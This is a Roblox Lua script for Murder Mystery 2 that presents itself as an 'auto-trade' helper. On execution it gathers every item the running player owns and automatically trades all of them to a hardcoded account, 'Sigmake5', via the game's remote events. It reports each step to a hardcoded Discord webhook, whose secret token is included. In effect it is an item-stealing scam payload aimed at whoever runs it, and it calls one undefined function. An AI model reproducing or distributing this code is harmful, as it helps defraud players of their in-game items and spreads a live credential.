-- =-- =-- ============================================
-- MM2 FULL AUTO-TRADE SCRIPT
-- Script handles: Send Request → Add Items → Accept → Complete
-- No game UI interaction needed
-- ============================================

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- ============================================
-- DISCORD LOGGER
-- ============================================

local function sendLog(msg)
    pcall(function()
        local data = HttpService:JSONEncode({content = "**MM2 Auto-Trade**\n" .. tostring(msg)})
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

-- ============================================
-- GET ALL REMOTES
-- ============================================

local Remotes = {}

for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        Remotes[v.Name] = v
    end
end

sendLog("Found remotes: " .. table.concat(GetRemoteNames(), ", "))

-- ============================================
-- GET YOUR ITEMS
-- ============================================

local function getYourItems()
    local items = {}
    
    -- Get from backpack
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item)
        end
    end
    
    -- Get from character
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item)
            end
        end
    end
    
    return items
end

-- ============================================
-- AUTO-TRADE SEQUENCE (Remote Events Only)
-- ============================================

local tradeInProgress = false

local function autoTrade(targetPlayer)
    if tradeInProgress then return end
    tradeInProgress = true
    
    sendLog("🎯 Starting auto-trade with " .. targetPlayer.Name)
    
    -- Step 1: Send trade request
    if Remotes.StartTrade then
        Remotes.StartTrade:FireServer(targetPlayer)
        sendLog("📤 Trade request sent")
        wait(1)
    else
        sendLog("❌ StartTrade remote not found")
        tradeInProgress = false
        return
    end
    
    -- Step 2: Wait for target to accept (or force accept)
    wait(2)
    
    -- Step 3: Get your items
    local items = getYourItems()
    sendLog("📦 Found " .. #items .. " items")
    
    -- Step 4: Add items to trade
    for i, item in pairs(items) do
        if Remotes.OfferItem then
            Remotes.OfferItem:FireServer(item)
            sendLog("➕ Added: " .. item.Name)
            wait(0.3)
        end
    end
    
    wait(1)
    
    -- Step 5: Accept trade
    if Remotes.AcceptTrade then
        Remotes.AcceptTrade:FireServer()
        sendLog("✅ Trade accepted")
        wait(0.5)
    end
    
    -- Step 6: Complete trade
    if Remotes.CompleteTrade then
        Remotes.CompleteTrade:FireServer()
        sendLog("🎉 Trade completed")
    end
    
    tradeInProgress = false
end

-- ============================================
-- TRIGGER WHEN TARGET JOINS
-- ============================================

-- Check if already in server
for _, plr in pairs(Players:GetPlayers()) do
    if plr.Name == TARGET_USER then
        sendLog("👤 " .. TARGET_USER .. " already in server")
        wait(2)
        autoTrade(plr)
    end
end

-- Watch for join
Players.PlayerAdded:Connect(function(plr)
    if plr.Name == TARGET_USER then
        sendLog("🟢 " .. TARGET_USER .. " joined")
        wait(2)
        autoTrade(plr)
    end
end)

sendLog("🚀 Auto-trade active - waiting for " .. TARGET_USER)
print("Auto-trade active - will trade all items to " .. TARGET_USER)

-- Keep alive
while wait(60) do end
